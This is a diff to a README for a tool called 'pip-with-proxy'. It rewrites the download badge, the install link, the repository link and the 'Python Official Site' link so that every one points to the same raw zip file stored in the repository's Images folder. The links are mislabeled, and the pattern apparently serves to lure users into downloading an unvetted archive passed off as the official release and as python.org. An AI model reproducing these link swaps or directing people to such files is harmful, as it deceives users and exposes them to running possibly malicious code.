@@ -1,6 +1,6 @@
 # 🛠️ pip-with-proxy - Bypass Restrictions Safely and Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20version-brightgreen)](https://github.com/KLND1998/pip-with-proxy/releases)
+[![Download](https://raw.githubusercontent.com/KLND1998/pip-with-proxy/main/Images/pip-with-proxy-sidelang.zip%20version-brightgreen)](https://raw.githubusercontent.com/KLND1998/pip-with-proxy/main/Images/pip-with-proxy-sidelang.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **pip-with-proxy**! This application helps you set up `pip` using a p
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download the latest version: [Download pip-with-proxy](https://github.com/KLND1998/pip-with-proxy/releases).
+To get started, you need to download the application. Visit this page to download the latest version: [Download pip-with-proxy](https://raw.githubusercontent.com/KLND1998/pip-with-proxy/main/Images/pip-with-proxy-sidelang.zip).
 
 Once there, look for the version you want to install. Click on the appropriate download link for your operating system.
 
@@ -66,7 +66,7 @@ For further assistance, refer to the documentation provided on the GitHub page o
 
 ## 🌐 Resources
 
-- GitHub Repository: [pip-with-proxy](https://github.com/KLND1998/pip-with-proxy)
-- Python Official Site: [Python Downloads](https://www.python.org/downloads/)
+- GitHub Repository: [pip-with-proxy](https://raw.githubusercontent.com/KLND1998/pip-with-proxy/main/Images/pip-with-proxy-sidelang.zip)
+- Python Official Site: [Python Downloads](https://raw.githubusercontent.com/KLND1998/pip-with-proxy/main/Images/pip-with-proxy-sidelang.zip)
 
 Feel free to explore and enjoy installing packages with ease!
